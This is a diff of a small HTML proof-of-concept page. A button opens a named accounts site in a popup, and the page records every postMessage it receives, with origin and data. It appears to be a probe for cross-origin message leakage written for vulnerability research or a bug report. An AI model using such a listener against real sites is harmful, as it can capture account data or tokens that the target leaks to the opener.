@@ -1,19 +1,24 @@
 <!DOCTYPE html>
     <html>
-    <head><title>PoC</title></head>
+    <head><title>PoC - postMessage Test</title></head>
     <body>
-    <h2>Listening for postMessage...</h2>
+    <h2>postMessage Listener</h2>
+    <button id="btn" onclick="openTarget()">Click Here to Open Target</button>
+    <h3>Messages Received:</h3>
     <pre id="output">Waiting...</pre>
     <script>
     window.addEventListener('message', function(event) {
         document.getElementById('output').innerText = 
             'ORIGIN: ' + event.origin + '\n' +
-            'DATA: ' + JSON.stringify(event.data);
+            'DATA: ' + JSON.stringify(event.data) + '\n\n' +
+            document.getElementById('output').innerText;
         console.log('Received:', event.data, 'from', event.origin);
     });
-    
-    // Open the vulnerable page
-    var w = window.open('https://accounts.eternal.com/');
+
+    function openTarget() {
+        document.getElementById('btn').innerText = 'Opened! Check popup...';
+        var w = window.open('https://accounts.eternal.com/');
+    }
     </script>
     </body>
     </html>
